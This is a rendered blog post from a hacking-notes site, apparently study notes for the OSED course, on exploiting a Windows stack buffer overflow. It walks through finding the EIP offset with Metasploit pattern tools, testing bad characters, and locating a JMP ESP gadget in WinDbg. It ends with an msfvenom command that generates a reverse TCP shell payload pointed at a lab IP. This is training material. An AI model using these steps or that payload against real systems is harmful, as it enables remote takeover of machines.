@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html class="" lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+        <script>
+            if (location.host != new URL("http:\/\/localhost:1313\/").host) location.href = "http:\/\/localhost:1313\/"
+        </script>
+    
+    <meta name="viewport" content="width=device-width" />
+    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=7" />
+
+    <link
+    rel="icon"
+    href='http://localhost:1313/favicon.png'
+/>
+<link
+    rel="shortcut icon"
+    href='http://localhost:1313/favicon.ico'
+    type="image/x-icon"
+/>
+<link
+    rel="apple-touch-icon"
+    href='http://localhost:1313/apple-touch-icon.png'
+/>
+
+    <link
+        rel="icon"
+        href='http://localhost:1313/favicon.png'
+        type="image/svg+xml"
+    />
+
+<title>
+        
+        purpurina - a place for hacking
+    </title>
+
+    
+    <link href="http://localhost:1313/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" integrity="sha512-lydow8GLOLlYNOtHlksNCmGWWCBsbIEtikXpHzfWqx78HLlyQZHOzyLwPpKol4Th6aCwLUXOfODVYgwrd3nwKQ=="/>
+    <link href="http://localhost:1313/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" integrity="sha512-tJxlgL6v1Y7kFf+qB8SloaAMKnOAw6WouknxXtIjkBux9Y/9aX81EUWOJO8c/3l98DmjG8brr4to7zaez606Fg=="/>
+
+    
+    
+    <link type="text/css" rel="stylesheet" href=http://localhost:1313/css/styles.b88203936c598b692d9cbebd7da89eb34e544b8522ae4c14ca657761be96b80c2acee8e6631de04d99ee1bdbc1bcad4a3add6f47a2366f4a29e2c531782be1a8.css integrity="sha512-uIIDk2xZi2ktnL69faies05US4UirkwUymV3Yb6WuAwqzujmYx3gTZnuG9vBvK1KOt1vR6I2b0op4sUxeCvhqA==" />
+<meta name="author" content="jaco" />
+
+    
+    
+        <meta name="description" content="-crash&#34;&gt;Locating the crash&lt;/h1&gt;
+&lt;p&gt;Generate the pattern with KALI or online.
+Put the pattern as payload and detect the offset of the crash.
+Once the offset is located, fill with As.&lt;/p&gt;
+&lt;p&gt;msf-pattern_create -l 2600&lt;/p&gt;
+&lt;p&gt;When crashing, EIP will have a certain value.
+Copy the value to obtain the exact offset:
+msf-pattern_offset -l 2600 -q &amp;ldquo;TBD_EIP&amp;rdquo;&lt;/p&gt;" />
+    
+
+<meta property="og:site_name"
+    content='purpurina - a place for hacking' />
+
+    <meta property="og:title" content="" />
+    <meta property="og:type" content="article" />
+    
+    <meta
+        property="article:author" content="jaco" />
+    <meta
+        property="article:published_time"
+        content='0001-01-01T00:00:00Z&#43;0000' />
+    
+    <meta property="og:url" content="http://localhost:1313/posts/osed_overflow_1/" />
+    
+    
+    <meta property="og:image"
+        content="http://localhost:1313/icon512.png" />
+    
+        <meta property="og:description" content="&lt;h1 id=&#34;locating-the-crash&#34;&gt;Locating the crash&lt;/h1&gt;
+&lt;p&gt;Generate the pattern with KALI or online.
+Put the pattern as payload and detect the offset of the crash.
+" />
+    
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:domain"
+      content='localhost:1313'
+/>
+<meta property="twitter:url" content="http://localhost:1313/posts/osed_overflow_1/" />
+
+
+    <meta name="twitter:title" content="" />
+    
+    
+    
+    <meta name="twitter:image"
+        content="http://localhost:1313/icon512.png" />
+    
+        <meta name="twitter:description" content="&lt;h1 id=&#34;locating-the-crash&#34;&gt;Locating the crash&lt;/h1&gt;
+&lt;p&gt;Generate the pattern with KALI or online.
+Put the pattern as payload and detect the offset of the crash.
+" />
+    
+
+<link rel="manifest" href="http://localhost:1313/manifest/index.json" />
+</head>
+
+
+<body>
+        <div id="baseContainer"><header class="">
+<div class="titleAndSearchContainer">
+        <div id="titleContainer">
+            
+                <a class="unstyledLink" href="http://localhost:1313/">
+                    <img src='http://localhost:1313/logo.jpg' alt='Logo'/>
+                </a>
+            
+            <div class="rightOfLogo">
+                <div class="titleAndHamburger">
+                    <h1>
+                        <a class="unstyledLink" href="http://localhost:1313/">purpurina - a place for hacking</a>
+                        
+                    </h1>
+                    
+                </div>
+                <div id="wide_nav"><nav>
+    
+    <ul id="main-nav">
+        <li><a href="http://localhost:1313/">Home</a></li>
+        
+            <li><a href="http://localhost:1313/posts/">Posts</a></li>
+        
+        
+        
+        
+        
+        
+            <li><a href="http://localhost:1313/about/">About</a></li>
+        
+        
+            <li><a href="http://localhost:1313/tags/">Tags</a></li>
+        
+        
+    </ul>
+</nav>
+</div>
+            </div>
+        </div>
+        <div class="search">
+    <input id="searchbar" type="text" placeholder='Search' />
+    <span class="nerdlink" onclick="newSearch();">&#xf002;</span>
+</div>
+<script>
+    function newSearch() {
+        let term = searchbar.value.trim();
+        if (!term) return;
+        location.href = `/search/?q=${term}`;
+    }
+    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
+</script>
+
+    </div>
+    <div id="links">
+        
+        
+        <a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://www.linkedin.com/in/jacobocasado/?originalSubdomain=es">
+    
+    
+        &#xf0e1;
+    
+    <span>
+        LinkedIn
+    </span>
+</a>
+
+    </div>
+    
+
+</header>
+<div id="contentContainer">
+                <div id="content">
+                    <main>
+<article class="card single">
+    
+        <h1></h1>
+    
+    
+        <p class="date">
+            <span title='Date'> </span>
+    0001-01-01
+
+</p>
+    
+    
+    
+    
+    <div><h1 id="locating-the-crash">Locating the crash</h1>
+<p>Generate the pattern with KALI or online.
+Put the pattern as payload and detect the offset of the crash.
+Once the offset is located, fill with As.</p>
+<p>msf-pattern_create -l 2600</p>
+<p>When crashing, EIP will have a certain value.
+Copy the value to obtain the exact offset:
+msf-pattern_offset -l 2600 -q &ldquo;TBD_EIP&rdquo;</p>
+<p>NOTE that the offset given by the tool DOES NOT COVER EIP.
+You will have to add 4 bytes after that offset to cover EIP.</p>
+<p>Once we add the buffer + the offset to cover EIP, it&rsquo;s turn to know where our shellcode is stored. Let&rsquo;s put some Cs, and see where ESP points:
+dds esp
+dds esp-4
+dds esp-8
+dds esp-10
+Until we don&rsquo;t see CS:
+<img src="content/images/post_images/osed_1.png" alt=""></p>
+<p>We know esp-8, then 8. We check it
+<img src="content/images/post_images/osed_1_1.png" alt="">
+Now badchars.</p>
+<pre tabindex="0"><code>badchars = ( b&#34;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10&#34; b&#34;\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20&#34; b&#34;\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30&#34; b&#34;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&#34; b&#34;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50&#34; b&#34;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60&#34; b&#34;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70&#34; b&#34;\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80&#34; b&#34;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90&#34; b&#34;\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&#34; b&#34;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0&#34; b&#34;\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0&#34; b&#34;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0&#34; b&#34;\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0&#34; b&#34;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0&#34; b&#34;\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&#34;)
+</code></pre><p>db esp Lff to show all the bytes and see if any is affected:
+<img src="content/images/post_images/osed_1_2.png" alt="">
+Delete badchars if applicable. See if any of them is missing and repeat the step.</p>
+<p>Now we have to find a JMP ESP ADDRESS in any DLL. Remember:</p>
+<ul>
+<li>That address must not contain badchars -&gt;</li>
+<li>The JMP ESP must not be in a read only section. If the DLL has DEP, .data is executable and we can use that address.</li>
+</ul>
+<p>We want the opcode of the JMP ESP instruction.
+In KALI, execute msf-nasm_shell and introduce jmp esp.
+The value is FFE4</p>
+<p>Then we see all modules with lmD
+and then we get our module with lm m &ldquo;TBD_module_name&rdquo;
+We should see the start and end address and confirm there are no badchars(remember, zeros are only bad at left)</p>
+<p>Then we search for the FFE4 (JMP ESP) instruction in that range:
+s -b START END 0xff 0xe4</p>
+<p>If we get an ocurrence, we confirm that the address does not contain badchars:
+<img src="content/images/post_images/osed_1_4.png" alt=""></p>
+<p>EIP will have to point to that address. Remember to put the address in little endian:
+eip = b&quot;\xcf\x10\x80\x14&quot; # 0x148010cf</p>
+<p><img src="content/images/post_images/osed_1_5.png" alt=""></p>
+<p>Generate msfvenom payload with badchars:</p>
+<pre tabindex="0"><code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.120 LPORT=443 -f python –e x86/shikata_ga_nai -b &#34;\x00\x0a\x0d\x25\x26\x2b\x3d&#34;
+</code></pre><p>Note that you can put the EXITFUNC=thread parameter so that only exits the thread and not the whole program when the shellcode is executed.</p>
+</div>
+</article>
+
+
+
+
+
+
+                    </main><footer>
+    <hr />
+
+<p><small>
+        2025 &copy; made by jaco with love
+    </small></p>
+    <p><small>
+        Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
+    </small></p>
+</footer>
+</div>
+            </div>
+        </div>
+
+
+</body>
+</html>
